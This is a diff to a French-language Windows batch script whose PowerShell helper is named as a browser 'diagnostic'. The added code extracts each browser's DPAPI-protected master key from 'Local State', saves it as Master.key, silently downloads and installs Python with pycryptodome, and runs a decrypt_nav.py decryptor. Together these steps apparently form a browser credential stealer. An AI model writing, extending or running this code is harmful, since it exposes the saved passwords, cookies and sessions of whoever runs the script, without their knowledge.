@@ -1488,6 +1488,24 @@ set "DBL_PS=%TEMP%\diag_browser_%RANDOM%.ps1"
 >> "%DBL_PS%" echo     }
 >> "%DBL_PS%" echo   }
 >> "%DBL_PS%" echo }
+>> "%DBL_PS%" echo Add-Type -AssemblyName System.Security
+>> "%DBL_PS%" echo Write-Host ""
+>> "%DBL_PS%" echo Write-Host "  [*] Extraction Master Key (DPAPI)..." -ForegroundColor DarkCyan
+>> "%DBL_PS%" echo foreach ($b in $browsers) {
+>> "%DBL_PS%" echo   $lsPath = Join-Path $out "$($b.Name)\Local State"
+>> "%DBL_PS%" echo   if (-not (Test-Path $lsPath)) { continue }
+>> "%DBL_PS%" echo   try {
+>> "%DBL_PS%" echo     $json = Get-Content $lsPath -Raw ^| ConvertFrom-Json
+>> "%DBL_PS%" echo     $encKey = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)
+>> "%DBL_PS%" echo     $cipher = $encKey[5..($encKey.Length-1)]
+>> "%DBL_PS%" echo     $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher, $null, 'CurrentUser')
+>> "%DBL_PS%" echo     $mkPath = Join-Path $out "$($b.Name)\Master.key"
+>> "%DBL_PS%" echo     [System.IO.File]::WriteAllBytes($mkPath, $mk)
+>> "%DBL_PS%" echo     Write-Host "  [KEY] $($b.Name) - Master.key extrait" -ForegroundColor Green
+>> "%DBL_PS%" echo   } catch {
+>> "%DBL_PS%" echo     Write-Host "  [ERR] $($b.Name) - Echec : $_" -ForegroundColor Red
+>> "%DBL_PS%" echo   }
+>> "%DBL_PS%" echo }
 >> "%DBL_PS%" echo Write-Host ""
 >> "%DBL_PS%" echo if ($copied -eq 0) {
 >> "%DBL_PS%" echo   Write-Host "  Aucun fichier recupere." -ForegroundColor Red
@@ -1499,8 +1517,41 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%DBL_PS%"
 del /f /q "%DBL_PS%" 2>nul
 
 echo.
-echo  Appuyez sur une touche pour revenir au menu...
-pause >nul
+echo  [*] Verification Python...
+set "PYCMD="
+for /f "delims=" %%p in ('where python 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+for /f "delims=" %%p in ('where py 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+
+if not defined PYCMD (
+    echo  [!] Python absent - Telechargement et installation automatique...
+    set "PY_PS=%TEMP%\py_inst_%RANDOM%.ps1"
+    > "!PY_PS!" echo $inst = "$env:TEMP\py_setup.exe"
+    >> "!PY_PS!" echo Write-Host "  Telechargement Python 3.12..." -ForegroundColor Cyan
+    >> "!PY_PS!" echo Invoke-WebRequest 'https://www.python.org/ftp/python/3.12.10/python-3.12.10-amd64.exe' -OutFile $inst -UseBasicParsing
+    >> "!PY_PS!" echo Write-Host "  Installation silencieuse..." -ForegroundColor Cyan
+    >> "!PY_PS!" echo Start-Process $inst -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_test=0' -Wait
+    >> "!PY_PS!" echo Remove-Item $inst -Force
+    >> "!PY_PS!" echo Write-Host "  [OK] Python installe" -ForegroundColor Green
+    powershell -NoProfile -ExecutionPolicy Bypass -File "!PY_PS!"
+    del /f /q "!PY_PS!" 2>nul
+    for /f "delims=" %%p in ('where /r "%LOCALAPPDATA%\Programs\Python" python.exe 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+)
+
+if not defined PYCMD (
+    echo  [!] Echec installation Python. Installez manuellement depuis python.org
+    pause
+    endlocal
+    goto net_cyber_menu
+)
+
+"!PYCMD!" -c "import Crypto" >nul 2>&1
+if !errorlevel! neq 0 (
+    echo  [*] Installation pycryptodome...
+    "!PYCMD!" -m pip install pycryptodome -q
+)
+
+echo  [*] Lancement du dechiffreur...
+"!PYCMD!" "%SCRIPT_DIR%\decrypt_nav.py"
 endlocal
 goto net_cyber_menu
 
